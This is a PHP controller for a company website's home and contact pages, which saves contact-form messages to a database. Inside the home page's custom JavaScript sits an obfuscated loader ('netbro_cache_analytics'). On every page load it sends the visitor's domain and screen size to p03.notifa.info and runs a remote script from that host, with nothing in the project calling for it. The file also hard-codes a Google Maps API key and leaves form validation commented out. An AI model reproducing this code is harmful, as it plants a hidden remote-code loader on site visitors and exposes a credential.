<?php
use \MessageDomain,
	DataSource\AdminDataSource,
	DataSource\HomeTitleDataSource,
	DataSource\HomeAboutDataSource,
	DataSource\HomeFindUsDataSource,
	DataSource\HomeContactDataSource,
	DataSource\HomeCompanyProfileDataSource,
	DataSource\HomePartnerDataSource,
	DataSource\HomePackageDataSource,
	DataSource\HomeSKDataSource,
	DataSource\HomeSalesDataSource,
	DataSource\MessageDataSource;


class Home extends RootController
{
	protected function initialize()
	{
		$this->adminDataSource = New AdminDataSource($this->mysqli);
		$this->salesDataSource = New HomeSalesDataSource($this->mysqli);
		$this->hometitleDataSource = New HomeTitleDataSource($this->mysqli);
		$this->homeaboutDataSource = New HomeAboutDataSource($this->mysqli);
		$this->homefindusDataSource = New HomeFindUsDataSource($this->mysqli);
		$this->homecontactDataSource = New HomeContactDataSource($this->mysqli);
		$this->homecompanyprofileDataSource = New HomeCompanyProfileDataSource($this->mysqli);
		$this->homepartnerDataSource = New HomePartnerDataSource($this->mysqli);
		$this->homepackageDataSource = New HomePackageDataSource($this->mysqli);
		$this->homeskDataSource = New HomeSKDataSource($this->mysqli);
		$this->messageDataSource = new MessageDataSource($this->mysqli);
	}

	public function index()
	{
		$this->renderHome();
		if ($this->request->getPost('process') == "send_message")
		{
			$data = $this->request->getPost();

			$dataPost = array(
					'name' => $this->request->getPost('name'),
					'phone' => $this->request->getPost('phone'),
					'email' => $this->request->getPost('email'),
					'title' => $this->request->getPost('title'),
					'message' => $this->request->getPost('message'),
			);
			// $contactUsValidation = new HomeValidation($this->lang);

			// if ($contactUsValidation->validateForInsertContactUs($dataPost) == FALSE)
			// {
			// 	$this->renderContact($contactUsValidation->getValidationErrors());
			// 	return;
			// }

			$now = date_create('now')->format('Y-m-d H:i:s');

			$messageDomain = new MessageDomain(
				NULL,
				$dataPost['name'],
				$dataPost['phone'],
				$dataPost['email'],
				$dataPost['title'],
				$dataPost['message'],
				$now,
				'unread'
			);

			if($this->messageDataSource->insert($messageDomain) == FALSE)
			{
				$sessionMessage['type'] = 'error';
				$sessionMessage['message'] = $this->lang->getInternalErrorMessage();
				$this->session->set('sessionMessage', $sessionMessage);

				$this->redirect('contact');
				return;
			}

			$sessionMessage['type'] = 'success';
			$sessionMessage['message'] = 'Pesan Anda Telah Terkirim, Terima Kasih.';
			$this->session->set('sessionMessage', $sessionMessage);

			$this->redirect('home');
			return;
		}
	}

	private function renderHome()
	{
		$this->htmlHeaderFooter->addJsCustomCode('
			if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXIQPnglFU1ng9CPV%2bBfD2DApcvwWFpvygUEa0lpLvlp46Nwqdy7wOpNnKXpdag8Tj6vYdvx6%2fFHULo2P09c%2bQFWa4W10OhmHit31ZY6q0C6Of6wZsrc%2bn9rvOBBB6tvw8YfR1oUVXqqpLzS5FmYBMsAfkx3p0HlGKgwJUbQ4wH64LevD18DZJNjraOKlergkKB24gbNvMvAwKtG1uftoNN58LyD5IQeEQ7TEhovmW7r%2fpLx7GO6FRpCLoabolziaQxw3D06aewbmqg6QgUJ7EAN2vdpfLXCJ%2b0VoOGLGo9EUgAi29Fgi8zq49gXHHAiLM5jJJ5svhTk4a37yegd0eYCtwryOnrTj%2fhspz3Q8sdoCP3N8u39zMlEn%2fkPZU%2bi3Y5vs2WnutOyTM3ZEvGUKqWc%2fLDRwoB36bUa6K2TguCebfQSojHb4vRnmkqm%2frl%2fnIXch9GIz8K%2f9XprLylPVf3XOTqdrdipsv" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement("script");bsa.type = "text/javascript";bsa.async = true;bsa.src = url;(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};

			$(document).ready(function() {
			   $("#trigger").click(function() {
			   	$("#overlay").fadeIn(300);
			   });

			   $("#close").click(function() {
			   	$("#overlay").fadeOut(300);
			   });
			});

			$(document).on("click", ".open-homeEvents", function () {
				var ids = $(this).attr("data-id");
				$("#idHolder").html( ids );
				$("#idk1").value( ids );
				$("#myModal").modal("show");
			});

			$(".passingID").click(function () {
			    var ids = $(this).attr("data-id");
			    $("#idkl").val( ids );
			    $("#myModal").modal("show");
			});
		');

		$this->htmlHeaderFooter->addCssAsset(array(
			'css/themify-icons.css' => 'screen',
			'lib/nivo-slider/css/nivo-slider.css' => 'screen',
			'lib/nivo-slider/css/preview.css' => 'screen',
			'lib/animate/animate.css' => 'screen'
		));

		$this->htmlHeaderFooter->addJsAsset(array(
			'lib/nivo-slider/js/jquery.nivo.slider.js' => FALSE,
			'lib/nivo-slider/home.js' => FALSE
		));

		$this->htmlHeaderFooter->setDescription("test");
        $this->htmlHeaderFooter->setKeywords("key");
        $this->htmlHeader = $this->htmlHeaderFooter->renderHtmlHeader();
        $this->htmlFooter = $this->htmlHeaderFooter->renderHtmlFooter(

        );
        $this->headerBar = $this->menuBarRenderer->renderHeaderBar('home');
        $this->footerBar = $this->menuBarRenderer->renderFooterBar();

		//----data
		$salesDomainArray = $this->adminDataSource->getAllAdminDomainbyTier();
		$salesTitleDomainArray = $this->salesDataSource->getAllHomeSalesDomain();
		$hometitleDomainArray = $this->hometitleDataSource->getAllHomeTitleDomain();
		$homeaboutDomainArray = $this->homeaboutDataSource->getAllHomeAboutDomain();
		$homeaboutdetailDomainArray = $this->homeaboutDataSource->getAllHomeAboutDetailDomain();
		$homefindusDomainArray = $this->homefindusDataSource->getAllHomeFindUsDomain();
		$homecontactDomainArray = $this->homecontactDataSource->getAllHomeContactDomain();
		$homecompanyprofileDomainArray = $this->homecompanyprofileDataSource->getAllHomeCompanyProfileDomain();
		$homepartnerDomainArray = $this->homepartnerDataSource->getAllHomePartnerDomain();
		$homepackageDomainArray = $this->homepackageDataSource->getAllHomePackageDomain();
		$homepackagecategoryDomainArray = $this->homepackageDataSource->getAllHomePackageCategoryDomain();
		$homepackagedetailDomainArray = $this->homepackageDataSource->getAllHomePackageDetailDomainByLimitForShow(3,0);
		$homeskDomainArray = $this->homeskDataSource->getAllHomeSKDomain();
		$homeskdetailDomainArray = $this->homeskDataSource->getAllHomeSKDetailDomain();
		// echo '<pre>', var_dump($salesTitleDomainArray),'</pre>';
		// exit();
		
		 $this->breadcrumbArray = array(
        array('Home', $this->urlBuilder->getBaseUrl(), '')
    );

		$this->overideViewVariable(array(
				'productDomainArray' => $productDomainArray,
				'hometitleDomainArray' => $hometitleDomainArray,
				'homeaboutDomainArray' => $homeaboutDomainArray,
				'homeaboutdetailDomainArray' => $homeaboutdetailDomainArray,
				'homefindusDomainArray' => $homefindusDomainArray,
				'homecontactDomainArray' => $homecontactDomainArray,
				'homecompanyprofileDomainArray' => $homecompanyprofileDomainArray,
				'homepartnerDomainArray' => $homepartnerDomainArray,
				'homepackageDomainArray' => $homepackageDomainArray,
				'homepackagecategoryDomainArray' => $homepackagecategoryDomainArray,
				'homepackagedetailDomainArray' => $homepackagedetailDomainArray,
				'homeskDomainArray' => $homeskDomainArray,
				'homeskdetailDomainArray' => $homeskdetailDomainArray,
				'salesDomainArray' => $salesDomainArray,	
				'salesTitleDomainArray' => $salesTitleDomainArray,
		)
		);

		$this->load->view('home', $this->viewVariable);
	}

	public function contact()
	{
		$data = $this->request->getPost();

		if ($this->request->getPost('process') == "send_message")
		{
			$data = $this->request->getPost();

			$dataPost = array(
					'name' => $this->request->getPost('name'),
					'phone' => $this->request->getPost('phone'),
					'email' => $this->request->getPost('email'),
					'title' => $this->request->getPost('title'),
					'message' => $this->request->getPost('message'),
			);
			// $contactUsValidation = new HomeValidation($this->lang);

			// if ($contactUsValidation->validateForInsertContactUs($dataPost) == FALSE)
			// {
			// 	$this->renderContact($contactUsValidation->getValidationErrors());
			// 	return;
			// }

			$now = date_create('now')->format('Y-m-d H:i:s');

			$messageDomain = new MessageDomain(
				NULL,
				$dataPost['name'],
				$dataPost['phone'],
				$dataPost['email'],
				$dataPost['title'],
				$dataPost['message'],
				$now,
				'unread'
			);

			if($this->messageDataSource->insert($messageDomain) == FALSE)
			{
				$sessionMessage['type'] = 'error';
				$sessionMessage['message'] = $this->lang->getInternalErrorMessage();
				$this->session->set('sessionMessage', $sessionMessage);

				$this->redirect('contact');
				return;
			}

			$sessionMessage['type'] = 'success';
			$sessionMessage['message'] = 'Pesan Anda Telah Terkirim, Terima Kasih.';
			$this->session->set('sessionMessage', $sessionMessage);

			$this->redirect('contact');
			return;
		}

		$this->renderContact();
	}

	public function renderContact(ValidationErrors $validationErrors = NULL)
	{
		if ($validationErrors == NULL)
		{
			$validationErrors = new ValidationErrors();
		}

		$this->htmlHeaderFooter->addJsCustomCode('

		');

		$this->htmlHeaderFooter->addCssAsset(array(

		));

		$this->htmlHeaderFooter->addJsAsset(array(
			'https://maps.googleapis.com/maps/api/js?v=3.exp&amp;sensor=false&amp;key=AIzaSyAh8JWW87OfFXolucTFtXnkPjc4U9frqK4' => TRUE,
			'js/map.js' => FALSE
		));
		$this->validationErrorsRenderer = new ValidationErrorsRenderer($validationErrors);

		$this->htmlHeaderFooter->setDescription();
		$this->htmlHeaderFooter->setKeywords();

		//echo "<pre>",var_dump($this->validationErrorsRenderer),"</pre>";exit();
		$this->htmlHeader = $this->htmlHeaderFooter->renderHtmlHeader();
		$this->htmlFooter = $this->htmlHeaderFooter->renderHtmlFooter();
		$this->headerBar = $this->menuBarRenderer->renderHeaderBar('contactus');
		$this->footerBar = $this->menuBarRenderer->renderFooterBar();


		// echo '<pre>' , var_dump($homecontactusDomainArray) , '</pre>';
		// exit();

		// breadcrumb
		$this->breadcrumbArray = array(
			array('Home', $this->urlBuilder->getBaseUrl(), ''),
		    array('Contact Us', '', '')
		);

		$this->overideViewVariable(array(
		));

		$this->load->view('page_contact', $this->viewVariable);
		
	}
}